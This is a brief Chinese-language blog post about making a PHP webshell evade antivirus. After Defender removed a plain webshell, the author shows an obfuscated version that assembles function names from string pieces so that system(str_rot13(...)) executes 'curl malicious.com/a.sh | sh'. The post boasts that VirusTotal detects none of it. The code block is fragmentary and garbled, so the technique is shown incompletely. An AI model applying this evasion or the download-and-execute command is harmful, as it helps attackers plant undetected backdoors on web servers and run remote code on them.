---
title: 簡單 PHP Webshell 免殺
date: 2022-02-15T14:31:48+08:00
draft: false
url: "/2022/02/15/簡單-php-webshell-免殺/"
categories:
  - 資訊安全
  - 網頁安全
  - 小玩具
showToc: true
TocOpen: false
---

原本想隨便寫一個 Webshell 測試使用，但一下就被 Defender 吃掉了

```php
 "str_ro"
// "str_ro"."t13" => "str_rot13"
// ("system")(("str_rot13")($e)) => system(str_rot13($e))
// system(str_rot13($e)) => system("curl malicious.com/a.sh | sh")
```

在 [VirusTotal ](https://www.virustotal.com/gui/file/6b09534b9965b665df60d91a634a6697a2a94484d7ab69d21eeb27047fc8bc95?nocache=1)上竟然 All pass ㄏ

![](/uploads/2022/02/圖片.png)
